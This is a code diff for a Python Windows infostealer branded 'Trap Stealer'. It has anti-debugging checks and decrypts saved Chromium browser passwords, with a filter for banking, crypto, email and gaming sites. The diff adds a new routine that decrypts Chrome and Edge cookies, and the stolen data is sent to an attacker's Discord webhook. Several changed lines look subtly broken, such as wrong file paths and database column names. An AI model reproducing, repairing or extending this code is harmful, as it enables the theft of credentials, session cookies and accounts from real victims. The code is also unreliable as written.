@@ -1,28 +1,27 @@
 # Import dont mind
-import os, base64, sys
-from os import getenv, startfile
-import threading
-from sys import executable
-import re
-from json import loads as json_loads, load
-from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
-from urllib.request import Request, urlopen
-import urllib.request
+import sys, time, random, threading, ctypes, shutil
+import os, re, socket, json, sqlite3, zipfile, subprocess
+import urllib.request, winreg, base64, getpass, platform
+from os.path import isfile, exists
+from ctypes import wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
 from json import loads, dumps
-import time
 from zipfile import ZipFile
-import subprocess
-import socket, getpass, ctypes
-import platform
 from shutil import copy
-from os.path import isfile
-import winreg, random
+from sys import executable
+from ctypes import windll
+from urllib.request import Request, urlopen
 from sqlite3 import connect as sql_connect
 from base64 import b64decode
+from json import loads as json_loads, load
+from os import getenv, startfile
+from os.path import isfile
+import winreg, random
+from base64 import b64decode
 import os.path, zipfile
-import shutil, json
-### CONFIG ### 
+import shutil, json, sqlite3
+from win32crypt import CryptUnprotectData
 
+### CONFIG ### 
 webhook = '%Webhook%' #Put ur webhook
 
 FakeWebhook = '%FakeWebhook%' # If True, starts a fake webhook tool with options to delete, spam, etc.
@@ -33,30 +32,25 @@ antidebugging = '%No_Debug%' # # If False, does not check for VM or debugger
 DiscordStop = '%Close%' # If True, prevents Discord from being launched again by removing content from the startup file. Note: this will disable injection.
 StartupMessage = 'Error while adding Trap into the startup folder' # DONT TOUCH / The message displayed if Startup is set to True
 
-
-
 def clear_command_prompt():
-    # Windows command prompt
     if os.name == 'nt':
         os.system('cls')
-    # Unix/Linux/Mac terminal
     else:
         os.system('clear')
 
-# Call the function to clear the command prompt
 clear_command_prompt()
-
 
 def antidebug():
     checks = [check_windows, check_ip, check_registry, check_dll]
     for check in checks:
         t = threading.Thread(target=check, daemon=True)
         t.start()
-
+coonum = 0
 def exit_program(reason):
     print(reason)
     ctypes.windll.kernel32.ExitProcess(0)
 
+PasswCount = 0
 def check_windows():
     @ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.POINTER(ctypes.c_void_p), ctypes.POINTER(ctypes.c_void_p))
     def winEnumHandler(hwnd, ctx):
@@ -219,7 +213,7 @@ def GetData(blob_out):
     windll.kernel32.LocalFree(pbData)
     return buffer.raw
 
-def CryptUnprotectData(encrypted_bytes, entropy=b''):
+def crunprot(encrypted_bytes, entropy=b''):
     buffer_in = create_string_buffer(encrypted_bytes, len(encrypted_bytes))
     buffer_entropy = create_string_buffer(entropy, len(entropy))
     blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)
@@ -669,7 +663,7 @@ def GetDiscord(path, arg):
     pathKey = path + "/Local State"
     with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
     master_key = b64decode(local_state['os_crypt']['encrypted_key'])
-    master_key = CryptUnprotectData(master_key[5:])
+    master_key = crunprot(master_key[5:])
     
     for file in os.listdir(pathC):
         if file.endswith(".log") or file.endswith(".ldb")   :
@@ -694,42 +688,36 @@ def writeforfile(data, name):
 paswWords = []
 Passw = []
 
-PasswCount = 0
 def getPassw(path, arg):
     global Passw, PasswCount
-    if not os.path.exists(path): return
-    lg = 'nigoL'
-    pathC = path + arg + f"/{lg[::-1]} Data"
-    if os.stat(pathC).st_size == 0: return
-
-    tempfold = temp + "wp" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
-
+    PasswCount += 1
+    if not exists(path):
+        return
+    pathC = path + arg + "/Local Data"
+    if not exists(pathC):
+        return
+    tempfold = temp + "wp" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for _ in range(8)) + ".db"
     shutil.copy2(pathC, tempfold)
-    conn = sql_connect(tempfold)
+    conn = sqlite3.connect(tempfold)
     cursor = conn.cursor()
-    cursor.execute(f"SELECT action_url, username_value, {pas[::-1]}_value FROM logins;")
+    cursor.execute("SELECT action_url, username_value, value FROM logins;")
     data = cursor.fetchall()
     cursor.close()
     conn.close()
     os.remove(tempfold)
 
     pathKey = path + "/Local State"
-    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
-    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
-    master_key = CryptUnprotectData(master_key[5:])
-    keyword = [
-    'mail', '[coinbase](https://coinbase.com)', '[sellix](https://sellix.io)', '[gmail](https://gmail.com)', '[steam](https://steam.com)', '[discord](https://discord.com)', '[riotgames](https://riotgames.com)', '[youtube](https://youtube.com)', '[instagram](https://instagram.com)', '[tiktok](https://tiktok.com)', '[twitter](https://twitter.com)', '[facebook](https://facebook.com)', 'card', '[epicgames](https://epicgames.com)', '[spotify](https://spotify.com)', '[yahoo](https://yahoo.com)', '[roblox](https://roblox.com)', '[twitch](https://twitch.com)', '[minecraft](https://minecraft.net)', 'bank', '[paypal](https://paypal.com)', '[origin](https://origin.com)', '[amazon](https://amazon.com)', '[ebay](https://ebay.com)', '[aliexpress](https://aliexpress.com)', '[playstation](https://playstation.com)', '[hbo](https://hbo.com)', '[xbox](https://xbox.com)', 'buy', 'sell', '[binance](https://binance.com)', '[hotmail](https://hotmail.com)', '[outlook](https://outlook.com)', '[crunchyroll](https://crunchyroll.com)', '[telegram](https://telegram.com)', '[pornhub](https://pornhub.com)', '[disney](https://disney.com)', '[expressvpn](https://expressvpn.com)', 'crypto', '[uber](https://uber.com)', '[netflix](https://netflix.com)']
-    for row in data: 
+    with open(pathKey, 'r', encoding='utf-8') as f:
+        local_state = json_loads(f.read())
+    master_key = b64decode(local_state['os_crypt']['encrypted_key'])[5:]
+    keyword = ['mail', 'coinbase', 'sellix', 'gmail', 'steam', 'discord', 'riotgames', 'youtube', 'instagram', 'tiktok', 'twitter', 'facebook', 'card', 'epicgames', 'spotify', 'yahoo', 'roblox', 'twitch', 'minecraft', 'bank', 'paypal', 'origin', 'amazon', 'ebay', 'aliexpress', 'playstation', 'hbo', 'xbox', 'buy', 'sell', 'binance', 'hotmail', 'outlook', 'crunchyroll', 'telegram', 'pornhub', 'disney', 'expressvpn', 'crypto', 'uber', 'netflix']
+    for row in data:
         if row[0] != '':
             for wa in keyword:
-                old = wa
-                if "https" in wa:
-                    tmp = wa
-                    wa = tmp.split('[')[1].split(']')[0]
                 if wa in row[0]:
-                    if not old in paswWords: paswWords.append(old)
-            Passw.append(f"URL: {row[0]} | Username: {row[1]} | {pas[::-1]}: {DecryptValue(row[2], master_key)}")
-            PasswCount += 1
+                    paswWords.append(wa)
+            Passw.append(f"URL: {row[0]} | Username: {row[1]} | Password: {DecryptValue(row[2], master_key)}")
+
     writeforfile(Passw, 'passw')
 
 
@@ -835,7 +823,6 @@ def upload_files_to_discord():
                 else:
                     pass
         finally:
-            # Ensure that the executor is properly shutdown even if an exception occurs
             executor.shutdown(wait=True)
 
 
@@ -1000,10 +987,9 @@ def Camera_get():
         }
 
         LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
-
-
 def paaz():
     try:
+        global PasswCount
         file = os.getenv("TEMP") + f"\wppassw.txt"
         filename = "wppassw.txt"
 
@@ -1017,7 +1003,36 @@ def paaz():
             "embeds": [
                 {
                     "title": f"🍪 Trap Stealer {pas[::-1]}",
-                    "description": f"Number of {pas[::-1]} : {PasswCount}\n{pas[::-1]} File URL : ",
+                    "description": f"Number of {pas[::-1]} : {PasswCount}",
+                    "color": 0xffb6c1,
+                    "fields": embed_fields,
+                    "thumbnail": {
+                        "url": "https://media.tenor.com/q-2V2y9EbkAAAAAC/felix-felix-argyle.gif"
+                    },
+                    "footer": {
+                        "text": "Trap Stealer | https://github.com/TheCuteOwl",
+                        "icon_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png"
+                    }
+                }
+            ]
+        }
+        LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
+    except:pass
+    try:
+        file = os.getenv("TEMP") + f"\wpcook.txt"
+        filename = "wpcook.txt"
+
+        a = upload_file(file)
+        embed_fields = [{"name": f"{filename}", "value": f"[Click here to download]({a})"}]
+        pas = 'eikooC'
+        data = {
+            "username": "Trap Stealer",
+            "content": "",
+            "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png",
+            "embeds": [
+                {
+                    "title": f"🍪 Trap Stealer {pas[::-1]}",
+                    "description": f"Number of {pas[::-1]} : {coonum}",
                     "color": 0xffb6c1,
                     "fields": embed_fields,
                     "thumbnail": {
@@ -1033,6 +1048,54 @@ def paaz():
         LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
     except:pass
 
+coonum = 0
+def getcook():
+    global coonum
+
+    def _z1v7s1(path):
+        if not os.path.exists(path):return 
+        with open(path,"r",encoding="utf-8") as f:local_state=json.load(f)
+        master_key=base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
+        master_key=CryptUnprotectData(master_key,None,None,None,0)[1]
+        return master_key
+
+    def _x2a6f6(buff,master_key):
+        iv=buff[3:15]
+        payload=buff[15:]
+        cipher=AES.new(master_key,AES.MODE_GCM,iv)
+        decrypted_pass=cipher.decrypt(payload)
+        decrypted_pass=decrypted_pass[:-16].decode()
+        return decrypted_pass
+
+
+    global coonum
+
+    appdata=os.getenv('LOCALAPPDATA')
+    browsers={'google-chrome':appdata+'\\Google\\Chrome\\User Data','microsoft-edge':appdata+'\\Microsoft\\Edge\\User Data'}
+    profiles=['Default','Profile 1','Profile 2','Profile 3','Profile 4','Profile 5']
+
+    cookies=[]
+
+    for path in browsers.values():
+        if not os.path.exists(path):continue
+        master_key=_z1v7s1(f'{path}\\Local State')
+        if not master_key:continue
+        for profile in profiles:
+            cookie_db=f'{path}\\{profile}\\Network\\Cookies'
+            if not os.path.exists(cookie_db):continue
+            try:
+                conn=sqlite3.connect(cookie_db)
+                cursor=conn.cursor()
+                cursor.execute('SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies')
+                for row in cursor.fetchall():
+                    coonum+=1
+                    if all(row[:4]):
+                        cookie=_x2a6f6(row[3],master_key)
+                        cookies.append({'host':row[0],'name':row[1],'path':row[2],'value':cookie,'expires':row[4]})
+                conn.close()
+            except:pass
+
+            
 def GatherZips(paths1, paths2, paths3):
     thttht = []
     for patt in paths1:
@@ -1091,6 +1154,7 @@ def GatherZips(paths1, paths2, paths3):
 
 
 def GatherAll():
+    global PasswCount
     c = 'emorhc'
     browserPaths = [        
         [f"{roaming}/Opera Software/Opera GX Stable", "opera.exe", "/Local Storage/leveldb", "/", "/Network", "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn" ],
@@ -1145,7 +1209,10 @@ def GatherAll():
         pa = threading.Thread(target=getPassw, args=[patt[0], patt[3]])
         pa.start()
         threadlist2.append(pa)
-
+        
+    coo = threading.Thread(target=getcook)
+    coo.start()
+    threadlist2.append(coo)
     for thread in threadlist2:
         thread.join()
 
